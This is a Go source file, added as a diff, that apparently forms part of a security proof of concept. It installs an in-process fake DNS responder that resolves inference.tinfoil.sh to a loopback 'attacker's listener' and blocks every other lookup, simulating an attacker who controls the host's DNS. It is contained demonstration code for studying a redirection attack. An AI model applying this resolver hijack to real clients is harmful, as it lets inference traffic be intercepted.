@@ -1,0 +1,98 @@
+package main
+
+// In-process DNS for the PoC: the pure-Go resolver's Dial is replaced by an
+// in-memory responder, so no DNS packet ever leaves the process. It answers
+// only inference.tinfoil.sh (A -> 127.11.22.33, the attacker's listener) and
+// returns NXDOMAIN for every other name, which also blocks all other egress.
+// This models an attacker who controls the summarizer's DNS/routing (the
+// untrusted host) - nothing in http.DefaultTransport or the SDK is modified.
+
+import (
+	"context"
+	"encoding/binary"
+	"fmt"
+	"io"
+	"net"
+	"strings"
+	"sync"
+
+	"golang.org/x/net/dns/dnsmessage"
+)
+
+const fakeRouterHost = "inference.tinfoil.sh"
+
+var (
+	attackerIP  = [4]byte{127, 11, 22, 33}
+	dnsLogMu    sync.Mutex
+	dnsLogLines []string
+)
+
+func dnsLog(s string) {
+	dnsLogMu.Lock()
+	dnsLogLines = append(dnsLogLines, s)
+	dnsLogMu.Unlock()
+}
+
+func dnsLogSnapshot() []string {
+	dnsLogMu.Lock()
+	defer dnsLogMu.Unlock()
+	return append([]string(nil), dnsLogLines...)
+}
+
+func installFakeDNS() {
+	net.DefaultResolver.PreferGo = true
+	net.DefaultResolver.Dial = func(ctx context.Context, network, address string) (net.Conn, error) {
+		client, server := net.Pipe()
+		go serveFakeDNS(server)
+		return client, nil
+	}
+}
+
+func serveFakeDNS(c net.Conn) {
+	defer c.Close()
+	for {
+		var lb [2]byte
+		if _, err := io.ReadFull(c, lb[:]); err != nil {
+			return
+		}
+		msg := make([]byte, binary.BigEndian.Uint16(lb[:]))
+		if _, err := io.ReadFull(c, msg); err != nil {
+			return
+		}
+		var p dnsmessage.Parser
+		h, err := p.Start(msg)
+		if err != nil {
+			return
+		}
+		q, err := p.Question()
+		if err != nil {
+			return
+		}
+		name := strings.TrimSuffix(q.Name.String(), ".")
+		resp := dnsmessage.Message{
+			Header:    dnsmessage.Header{ID: h.ID, Response: true, Authoritative: true, RecursionDesired: h.RecursionDesired, RecursionAvailable: true},
+			Questions: []dnsmessage.Question{q},
+		}
+		if name == fakeRouterHost {
+			if q.Type == dnsmessage.TypeA {
+				resp.Answers = []dnsmessage.Resource{{
+					Header: dnsmessage.ResourceHeader{Name: q.Name, Type: dnsmessage.TypeA, Class: dnsmessage.ClassINET, TTL: 60},
+					Body:   &dnsmessage.AResource{A: attackerIP},
+				}}
+				dnsLog(fmt.Sprintf("DNS A %s -> %d.%d.%d.%d (attacker)", name, attackerIP[0], attackerIP[1], attackerIP[2], attackerIP[3]))
+			}
+		} else {
+			resp.Header.RCode = dnsmessage.RCodeNameError
+			dnsLog(fmt.Sprintf("DNS %s %s -> NXDOMAIN (egress blocked)", q.Type, name))
+		}
+		out, err := resp.Pack()
+		if err != nil {
+			return
+		}
+		var ob [2]byte
+		binary.BigEndian.PutUint16(ob[:], uint16(len(out)))
+		if _, err := c.Write(append(ob[:], out...)); err != nil {
+			return
+		}
+	}
+}
